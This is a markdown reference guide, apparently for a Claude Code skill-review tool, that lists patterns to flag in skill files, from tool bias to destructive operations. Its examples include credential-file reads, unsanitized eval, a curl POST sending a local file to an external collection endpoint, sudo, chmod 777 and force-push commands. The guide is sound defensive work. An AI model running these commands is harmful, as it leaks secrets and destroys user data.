# Security Flag Reference for Curate

Use this guide when scanning source skill content in Step 3. For each category, examples show what to flag and what NOT to flag to avoid over-reporting.

---

## Preferential bias

**Flag when**: A tool, vendor, editor, or style is presented as the only option without rationale, and valid alternatives are excluded or dismissed.

Examples to flag:
- `"Always use VSCode for editing"` — forces a specific editor
- `"Use npm, never yarn or pnpm"` — excludes valid alternatives without reason
- `"Format with Black only; other formatters are wrong"` — opinionated without stating a project-specific reason
- `"Always commit via GitHub Desktop"` — forces a GUI tool over CLI

**NOT a flag**:
- Recommending a common default with a stated rationale: `"Use pytest (standard for this project's test suite)"`
- Using the repo's existing toolchain: `"Run npm test (package.json uses npm)"`
- Style conventions that reference a named guide: `"Follow PEP 8"`

---

## Security concern

**Flag when**: The skill reads sensitive credential files, passes user input to a shell interpreter without sanitization, or sends local file contents to external services.

Examples to flag:
- `cat .env`, `cat ~/.netrc`, `cat ~/.aws/credentials`, `cat ~/.ssh/id_rsa` — reading credential files
- `eval $ARGUMENTS`, `eval $1`, `sh -c "$USER_INPUT"`, `exec(arguments[0])` — unsanitized shell/code execution
- `curl -X POST https://external-service.example.com/collect -d @local-file.txt` — exfiltrating local content to a third-party endpoint
- `WebFetch` with POST/PUT to a non-GitHub, non-localhost URL that includes local file content in the body

**NOT a flag**:
- `WebFetch` GET requests to public APIs (read-only, no local data sent)
- Fetching from `raw.githubusercontent.com` or `api.github.com`
- Reading non-sensitive project files (source code, config without secrets)
- `curl` GET to a documentation or package registry URL

---

## Permission breach

**Flag when**: The skill escalates privileges, writes outside the repo tree to system or user configuration, or accesses private user directories that weren't referenced in `$ARGUMENTS`.

Examples to flag:
- `sudo <any command>` — privilege escalation
- Writing to `/etc/`, `/usr/`, `/Library/`, `/System/` — system directories
- `chmod 777 <file>` — unsafe permissions
- Modifying `~/.bashrc`, `~/.zshrc`, `~/.profile`, `~/.gitconfig` without explicit user instruction
- Reading `~/Documents`, `~/Desktop`, or arbitrary home-directory files that were not passed as arguments

**NOT a flag**:
- Writing to `${PWD}` or paths derived from `$ARGUMENTS` — the user explicitly provided them
- Reading repo files anywhere under the working directory
- `chmod +x` on a script the skill just created in the repo

---

## Invalid operation

**Flag when**: The skill calls a tool that does not exist in Claude Code, uses an API with an incorrect shape, or references a slash command that is not registered.

Valid Claude Code tools: `Bash`, `Read`, `Write`, `Edit`, `Glob`, `Grep`, `WebFetch`, `WebSearch`, `Task`, `TaskCreate`, `TaskUpdate`, `TaskGet`, `TaskList`, `TaskOutput`, `TaskStop`, `Agent`, `Skill`, and any `mcp__*` tool.

Examples to flag:
- Calling `FileSystem.readDir(...)` — not a real Claude Code tool
- Using `GitHub.createPR(...)` as if it were a built-in tool (it's an MCP tool and may not be installed)
- Referencing `/some-command` as a dependency skill without noting it may not be present
- GitHub API calls using the wrong HTTP verb (e.g., POST to a GET-only endpoint)

**NOT a flag**:
- Calling `mcp__*` tools — these are legitimate MCP server calls; availability depends on the user's setup, but the pattern is valid
- Referencing `skill-stat` as an optional dependency with a `test -f` check before use

---

## Destructive operation

**Flag when**: The skill performs an irreversible action — deleting files, force-pushing, hard-resetting, or overwriting files — WITHOUT a preceding `### Gate:` block or an explicit confirmation prompt asking the user.

Examples to flag:
- `rm -rf <directory>` with no confirmation step before it
- `git push --force` or `git push -f` with no gate
- `git reset --hard` with no gate
- `> filename` redirect that overwrites a file with no prior Read or backup step
- `DROP TABLE` or `DELETE FROM` without a WHERE clause or confirmation

**NOT a flag**:
- Destructive operations that are already behind a `### Gate:` section
- Destructive operations where the skill explicitly asks the user for confirmation before proceeding
- `rm` on a file the skill itself just created in the same session (low risk of data loss)
